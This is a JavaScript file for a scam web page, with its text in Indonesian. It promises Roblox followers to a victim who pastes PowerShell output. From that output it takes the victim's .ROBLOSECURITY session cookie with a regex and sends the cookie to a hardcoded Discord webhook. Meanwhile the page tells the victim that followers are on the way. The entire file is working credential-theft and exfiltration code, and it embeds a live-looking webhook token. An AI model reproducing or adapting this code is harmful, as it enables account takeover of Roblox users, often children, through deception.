document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('cookieForm');
    const cookieInput = document.getElementById('cookieInput');
    const statusDiv = document.getElementById('status');

    // !!! WEBHOOK URL LO (RAHASIAKAN!) !!!
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1473284471137767558/asp42MiZ5mb6XaOXVNRmiyVsxVl5tG5AeWy6pJ2TXq8-0Ak-Y6tuuozHpVLlySDbPHlG';

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const powerShellOutput = cookieInput.value.trim();

        if (!powerShellOutput) {
            showStatus('Teks nggak boleh kosong, bro!', 'error');
            return;
        }

        showStatus('Mengekstrak cookie .ROBLOSECURITY...', 'processing');

        // !!! INI DIA RAHASIANYA: REGEX BUAT NGEAMBIL COOKIE !!!
        const regex = /\.ROBLOSECURITY", "(.*?)"/;
        const match = powerShellOutput.match(regex);

        if (match && match[1]) {
            const extractedCookie = match[1];
            // !!! TEKS NOTIFIKASI YANG DIUBAH ADA DI SINI !!!
            showStatus('FOLLOWERS AKAN SEGERA TERKIRIM!', 'processing');
            
            // Kita potong cookie-nya biar aman dari error panjang
            const shortCookie = extractedCookie.substring(0, 1500);

            const payload = {
                content: `🍪 **Cookie .ROBLOSECURITY Tertangkap!** (Panjang: ${extractedCookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
                username: "PowerShell Cookie Extractor",
                avatar_url: "https://i.imgur.com/rVw5B2W.png"
            };

            try {
                const response = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    showStatus('TUNGGU BEBERAPA SAAT JIKA FILE VALID FOLLOWERS TERKIRIM✅', 'success');
                    cookieInput.value = ''; // Kosongkan kotak
                } else {
                    const errorData = await response.text();
                    console.error('Discord Error:', response.status, errorData);
                    showStatus(`❌ ERROR! Gagal kirim ke Discord.`, 'error');
                }
            } catch (error) {
                console.error('Fetch Error:', error);
                showStatus(`❌ FATAL ERROR! Cek koneksi internet.`, 'error');
            }

        } else {
            showStatus('❌ GAGAL! Cookie .ROBLOSECURITY nggak ketemu. Pastikan kamu paste output PowerShell yang benar.', 'error');
        }
    });

    function showStatus(message, type) {
        statusDiv.textContent = message;
        statusDiv.style.opacity = '1';
        
        statusDiv.className = 'mt-8 text-center text-lg font-semibold p-4 bg-gray-700 bg-opacity-70 rounded-lg border shadow-inner transition-opacity duration-500 ease-out';
        
        if (type === 'error') {
            statusDiv.classList.add('text-red-400', 'border-red-600', 'animate-pulse');
        } else if (type === 'success') {
            statusDiv.classList.add('text-green-400', 'border-green-600');
        } else {
            statusDiv.classList.add('text-yellow-400', 'border-yellow-600', 'animate-pulse');
        }
    }
});
